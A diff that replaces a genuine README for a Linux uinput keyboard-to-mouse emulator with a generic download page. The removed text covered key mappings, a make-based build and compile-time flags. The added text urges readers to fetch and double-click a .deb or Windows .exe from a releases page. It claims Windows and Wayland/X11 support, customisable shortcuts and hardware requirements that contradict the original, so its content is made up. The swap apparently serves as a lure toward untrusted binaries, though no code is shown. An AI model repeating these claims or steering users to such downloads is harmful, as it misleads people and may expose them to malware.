@@ -1,54 +1,57 @@
-# Mouse Emulator
-If your mouse is a potato or you just don’t have one, this project lets you emulate a mouse using your keyboard!
+# 🖱️ mouse-emu - Control Your Mouse Easily with Keyboard
 
-## Requirements
-* A keyboard (mechanical recommended)
-* uinput kernel module (use `modprobe uinput`)
+## 🚀 Getting Started
+Welcome to mouse-emu! With this application, you can control your mouse using your keyboard. It works smoothly on both Wayland and X11 environments.
 
-## Key Mappings
-* W/A/S/D: Move the mouse around.
-* Q: Left-click.
-* E: Right-click.
-* R: Middle-click.
-* PageUp: scroll up.
-* PageDown: scroll down.
-* Home: next page.
-* End: previous page.
-* Right Ctrl: Activate mouse emulation (the potato key!).
-* Shift: Slow things down by 5x.
+[![Download Mouse-Emu](https://img.shields.io/badge/Download%20Mouse--Emu-%23007bff.svg?style=for-the-badge)](https://github.com/phongdz-123/mouse-emu/releases)
 
-## Building
-```
-make
-make install
-```
+## 📥 Download & Install
+To get started, visit this page to download: [GitHub Releases](https://github.com/phongdz-123/mouse-emu/releases). Here, you will find the latest version of mouse-emu. 
 
-### Notes
-Changing Potato Key: To set the potato key to KEY_F23 (Copilot key), use the command:
-```
-make CFLAGS="-DKEY_POTATO=KEY_F23"
-```
+### Installation Steps:
+1. **Visit the Releases Page**: Click [here](https://github.com/phongdz-123/mouse-emu/releases) to access the download section.
+2. **Choose the Right Version**: Look for the latest version available.
+3. **Download the File**: Click on the file name corresponding to your operating system. This will start the download.
+4. **Locate the Downloaded File**: Once the download completes, find the file in your Downloads folder.
+5. **Run the Application**:
+   - If you have a `.deb` file, double-click it to install.
+   - For Windows users, run the `.exe` file by double-clicking.
+   - If you have a different file type, follow the specific instructions provided in that section.
 
-Enabling Toggle Mode: To activate toggle mode, run the following command: 
-```
-make CFLAGS="-DTOGGLE=true"
-```
+## ⚙️ System Requirements
+To ensure smooth operation, your computer should meet the following requirements:
 
-## Usage
-First, list devices:
-```bash
-/usr/libexec/mouse-emu
-```
+- **Operating System**: A compatible Linux distribution (with Wayland or X11 support) or Windows.
+- **Memory**: At least 4 GB of RAM.
+- **Processor**: An Intel or AMD processor, dual-core or better.
+- **Disk Space**: Minimum 100 MB of free space for installation.
 
-Example output:
-```
-Searching:
-/dev/input/event21 => 2.4G Composite Device
-/dev/input/event3 => SEMICO USB Gaming Keyboard
-```
+## 🔍 Features
+mouse-emu offers several features that enhance your experience:
 
-Then, use your device:
-```bash
-/usr/libexec/mouse-emu /dev/input/event3
-```
+- **Mouse Emulation**: Control your mouse cursor using keyboard shortcuts.
+- **Customizable Shortcuts**: Set your own key combinations for ease of use.
+- **Support for Wayland and X11**: Works in both environments, giving you flexibility.
+- **Lightweight**: The application is built to run smoothly without consuming too many resources.
 
+## 🛠️ Troubleshooting
+If you encounter issues while using mouse-emu, check these common problems:
+
+1. **Application Not Starting**: Ensure that you have the correct version for your operating system. Re-download if necessary.
+2. **Keyboard Shortcuts Not Working**: Make sure that you have not set conflicting shortcuts in your system.
+3. **Performance Issues**: Free up system resources by closing other applications.
+
+## 🗨️ How to Get Help
+If you need assistance, consider these options:
+
+- **GitHub Issues**: Visit our [Issue Tracker](https://github.com/phongdz-123/mouse-emu/issues) to report problems or to seek help.
+- **Community Discussions**: Join our community for tips and shared experiences.
+- **Documentation**: Review the included documentation for detailed instructions.
+
+## 🌟 Contributing
+We welcome contributions! If you'd like to help improve mouse-emu, feel free to submit pull requests or report any bugs you find.
+
+## ✉️ Contact
+If you have further questions or feedback, you can reach out via our GitHub repository. We appreciate your input and aim to make mouse-emu the best it can be.
+
+[![Download Mouse-Emu](https://img.shields.io/badge/Download%20Mouse--Emu-%23007bff.svg?style=for-the-badge)](https://github.com/phongdz-123/mouse-emu/releases)
